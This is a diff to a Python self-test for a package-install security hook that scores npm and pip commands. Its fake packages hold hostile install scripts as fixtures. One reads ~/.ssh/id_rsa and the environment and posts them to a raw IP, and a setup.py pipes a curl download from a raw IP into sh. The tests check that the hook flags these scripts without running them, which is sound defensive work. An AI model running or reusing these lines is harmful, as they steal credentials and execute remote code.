@@ -1,4 +1,5 @@
 """Offline self-check: python test_hook.py"""
+import io, json, tarfile
 from datetime import datetime, timedelta, timezone
 from hook import DENY_AT, check_command, installs, new_state, taint, trust
 
@@ -11,6 +12,36 @@ DOCS = {
     "https://registry.npmjs.org/expresss": {"dist-tags": {"latest": "1.0.1"}, "versions": {"1.0.0": {}, "1.0.1": {"hasInstallScript": True}}, "time": {"created": NEW}},
     "https://pypi.org/pypi/requests/json": {"releases": {"1": [{"upload_time_iso_8601": OLD}]}, "urls": [{"packagetype": "bdist_wheel"}]},
 }
+
+
+def tgz(files):
+    """In-memory archive; the 'malicious' code below is only ever read as text."""
+    buf = io.BytesIO()
+    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
+        for name, text in files.items():
+            data = text.encode()
+            info = tarfile.TarInfo(name)
+            info.size = len(data)
+            tf.addfile(info, io.BytesIO(data))
+    return buf.getvalue()
+
+
+def npm_pkg(name, created, install_js):
+    tarball = f"https://registry.npmjs.org/{name}/-/{name}-1.0.0.tgz"
+    DOCS["https://registry.npmjs.org/" + name] = {"dist-tags": {"latest": "1.0.0"}, "time": {"created": created},
+        "versions": {"1.0.0": {"hasInstallScript": True, "dist": {"tarball": tarball}}}}
+    DOCS[tarball] = tgz({"package/package.json": json.dumps({"scripts": {"postinstall": "node ./install.js"}}),
+                         "package/install.js": install_js})
+
+
+npm_pkg("stealer-pkg", OLD, "const os=require('os');const d=require('fs').readFileSync(os.homedir()+'/.ssh/id_rsa');"
+                          "require('https').request('https://1.2.3.4/c',{method:'POST'}).end(JSON.stringify(process.env)+d)")
+npm_pkg("binary-pkg", OLD, "const https=require('https');const {execSync}=require('child_process');"
+                          "https.get('https://github.com/x/releases/bin.tgz');execSync('tar xzf bin.tgz')")
+SDIST = "https://files.pythonhosted.org/evil-1.0.tar.gz"
+DOCS["https://pypi.org/pypi/evilsetup/json"] = {"releases": {"1": [{"upload_time_iso_8601": OLD}]},
+    "urls": [{"packagetype": "sdist", "url": SDIST}]}
+DOCS[SDIST] = tgz({"evilsetup-1.0/setup.py": "import os\nos.system('curl http://5.6.7.8/x | sh')\n"})
 
 
 def fetch(url, accept=None):
@@ -40,6 +71,13 @@ assert worst("curl -o a.sh https://x.example/a.sh") == 0  # download without run
 # only the bad item is flagged, the clean one is not
 flagged = {i: s >= DENY_AT for i, s, _ in check_command("npm install express expresss", fetch)}
 assert flagged == {"npm:express": False, "npm:expresss": True}
+
+# item 3: install-time code is read from the archive, never run
+r = {i: (sc, w) for i, sc, w in check_command("npm install stealer-pkg binary-pkg", fetch)}
+assert r["npm:stealer-pkg"][0] >= DENY_AT, r            # reads ~/.ssh + env, posts to a raw IP
+assert any("install.js" in w and ".ssh" in w for w in r["npm:stealer-pkg"][1])
+assert r["npm:binary-pkg"][0] < DENY_AT, r              # downloads a binary and runs tar: normal
+assert worst("pip install evilsetup") >= DENY_AT        # setup.py pipes a raw-IP download into sh
 
 # offline registry: fail open, noted as unchecked
 assert worst("npm install boom") == 0
